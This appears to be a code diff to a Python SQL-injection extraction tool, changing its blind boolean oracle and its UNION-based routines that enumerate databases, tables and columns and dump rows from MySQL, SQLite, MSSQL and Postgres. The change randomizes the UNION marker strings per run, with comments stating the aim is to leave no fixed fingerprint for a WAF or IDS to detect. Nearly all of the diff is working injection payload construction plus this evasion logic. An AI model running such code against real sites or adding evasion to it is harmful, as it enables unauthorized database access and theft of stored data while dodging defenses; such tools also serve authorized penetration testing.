@@ -17,8 +17,11 @@ from __future__ import annotations
 
 import difflib
 import html as _html
+import random
 import re
+import string
 import time
+from collections import namedtuple
 from urllib.parse import parse_qs, urlencode, urlsplit, urlunsplit
 
 # Injection contexts: how to wrap an arbitrary boolean condition C around the
@@ -122,7 +125,7 @@ class Oracle:
     """A yes/no question to the database: ask(condition) -> True/False."""
 
     def __init__(self, http, url, param, value, template, context, true_text, false_text,
-                 threshold=0.9, console=None):
+                 console=None):
         self.http = http
         self.url, self.param, self.value = url, param, value
         self.template, self.context = template, context
@@ -131,7 +134,8 @@ class Oracle:
         # prefix/suffix (the identical page chrome). difflib then works on tens of
         # characters instead of thousands — much faster on big pages — and the
         # TRUE/FALSE margin is far wider, so bits are reliable even when the tell is
-        # a single line. (`threshold` arg kept for signature compat; recomputed here.)
+        # a single line. The threshold below (for anomaly detection in ask) is derived
+        # from those trimmed cores, never a fixed cutoff.
         self._pre, self._suf = _common_affixes(true_text, false_text)
         self._tcore = self._core(true_text)
         self._fcore = self._core(false_text)
@@ -139,6 +143,7 @@ class Oracle:
         self.console = console
         self.cache = None        # a sqlcache.Cache once a walk starts (resume/skip)
         self.blocked = 0         # responses matching neither page (WAF / error / filter)
+        self.marks = _new_marks()  # per-run UNION markers — no static on-wire fingerprint
 
     def _core(self, s: str) -> str:
         """The part of a response that actually reacts to the condition — the page
@@ -229,12 +234,10 @@ def calibrate(http, url, param, value, console=None):
         signal = _sim(t1, f)                         # how far FALSE sits from TRUE
         margin = max(0.0008, 3.0 * (1.0 - noise))    # must beat the page's own jitter
         if noise - signal > margin:
-            # Threshold between the two pages: a response far below it on *both* is
-            # neither — an error/WAF block, not a clean answer (used for anomaly
-            # detection in ask, never for the bit decision).
-            threshold = min(0.95, (1.0 + signal) / 2)
-            o = Oracle(http, url, param, value, tmpl, context, t1, f,
-                       threshold=threshold, console=console)
+            # The oracle derives its own TRUE/FALSE threshold from the trimmed cores
+            # (see Oracle.__init__); a response far below it on *both* sides is neither —
+            # an error/WAF block, flagged in ask() for anomaly detection, never a bit.
+            o = Oracle(http, url, param, value, tmpl, context, t1, f, console=console)
             # Confirm with two structurally-distinct true/false pairs. A real oracle
             # answers by *meaning*, so both true forms land on the TRUE page; a page
             # that merely reflects the payload text would not, so this rejects a
@@ -595,9 +598,31 @@ def _uscope(dbms, which, db):
 # binary-searching each character — orders of magnitude faster than blind.
 
 _COMMENT = "-- -"          # the comment that swallows the rest of the original query
+
+# UNION markers wrap and separate extracted data in the reflected output. They're
+# randomized per run (each Oracle gets its own set), so there's no static string for
+# a WAF/IDS to fingerprint hickok by, and a value that happens to contain one run's
+# delimiter won't keep colliding on a re-run. The constants below are only the
+# fallback for an oracle without its own set; real walks use _new_marks().
 _UMARK = "hKx9q"           # delimiter wrapped around extracted data
 _UROWSEP = "~r0w~"
 _UCOLSEP = "~c0l~"
+
+_Marks = namedtuple("_Marks", "umark rowsep colsep")
+_DEFAULT_MARKS = _Marks(_UMARK, _UROWSEP, _UCOLSEP)
+
+
+def _new_marks() -> _Marks:
+    """A fresh, per-run set of UNION markers — tilde-wrapped (rare in page data) with
+    a random core, so there's no fixed fingerprint and no cross-run collision."""
+    rid = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
+    return _Marks(f"~{rid}m~", f"~{rid}r~", f"~{rid}c~")
+
+
+def _marks_of(oracle) -> _Marks:
+    """The oracle's own markers, falling back to the module defaults (for an oracle
+    constructed without a set — the union helpers never assume one is present)."""
+    return getattr(oracle, "marks", None) or _DEFAULT_MARKS
 
 # Catalog sources per DBMS: "<column> FROM <rest>".
 _UFROM = {
@@ -649,8 +674,8 @@ def _ucat(dbms, parts):
     return "(" + ("+" if dbms == "mssql" else "||").join(parts) + ")"
 
 
-def _uagg(dbms, expr):
-    sep = _strlit(dbms, _UROWSEP)
+def _uagg(dbms, expr, rowsep):
+    sep = _strlit(dbms, rowsep)
     if dbms == "mysql":
         return f"group_concat({expr} SEPARATOR {sep})"
     if dbms == "sqlite":
@@ -687,8 +712,9 @@ def union_setup(http, oracle, dbms, maxcols=15):
             break
     if not ncols:
         return None
+    umark = _marks_of(oracle).umark
     for refcol in range(ncols):
-        mark = f"{_UMARK}{refcol}z"
+        mark = f"{umark}{refcol}z"
         cols = ["NULL"] * ncols
         cols[refcol] = _strlit(dbms, mark)
         r = _html.unescape(_inject(http, oracle.url, oracle.param,
@@ -703,23 +729,25 @@ def union_value(http, oracle, dbms, ncols, refcol, expr):
     inner = f"({expr})"
     if dbms in ("mssql", "postgres"):
         inner = f"cast({inner} as varchar(4000))"
-    mark = _strlit(dbms, _UMARK)
+    umark = _marks_of(oracle).umark
+    mark = _strlit(dbms, umark)
     cols = ["NULL"] * ncols
     cols[refcol] = _ucat(dbms, [mark, inner, mark])
     q = _quote_for(oracle.context)
     payload = f"{oracle.value}{q} AND 1=2 UNION SELECT {','.join(cols)}{_COMMENT}"
     body = _html.unescape(_inject(http, oracle.url, oracle.param, payload))
-    m = re.search(re.escape(_UMARK) + "(.*?)" + re.escape(_UMARK), body, re.S)
+    m = re.search(re.escape(umark) + "(.*?)" + re.escape(umark), body, re.S)
     return m.group(1) if m else ""
 
 
 def _union_list(http, oracle, dbms, ncols, refcol, which, db=None, **fmt):
     if "t" in fmt:                       # table name goes in as a quote-free literal
         fmt["t"] = _strlit(dbms, fmt["t"])
+    rowsep = _marks_of(oracle).rowsep
     frag = _dequote(dbms, _uscope(dbms, which, db).format(**fmt))   # also the static predicates
     col, _, frm = frag.partition(" FROM ")
-    data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, col)} FROM {frm}")
-    return [x for x in data.split(_UROWSEP) if x]
+    data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, col, rowsep)} FROM {frm}")
+    return [x for x in data.split(rowsep) if x]
 
 
 def union_databases(http, oracle, dbms, ncols, refcol):
@@ -735,7 +763,8 @@ def union_columns(http, oracle, dbms, ncols, refcol, table, db=None):
 
 
 def union_dump(http, oracle, dbms, ncols, refcol, table, cols, db=None):
-    colsep = _strlit(dbms, _UCOLSEP)
+    marks = _marks_of(oracle)
+    colsep = _strlit(dbms, marks.colsep)
     parts = []
     for i, c in enumerate(cols):
         if i:
@@ -743,5 +772,5 @@ def union_dump(http, oracle, dbms, ncols, refcol, table, cols, db=None):
         parts.append(f"cast({c} as varchar(4000))" if dbms in ("mssql", "postgres") else c)
     row = _ucat(dbms, parts)
     src = _qualify(dbms, db, table)
-    data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, row)} FROM {src}")
-    return [r.split(_UCOLSEP) for r in data.split(_UROWSEP) if r]
+    data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, row, marks.rowsep)} FROM {src}")
+    return [r.split(marks.colsep) for r in data.split(marks.rowsep) if r]
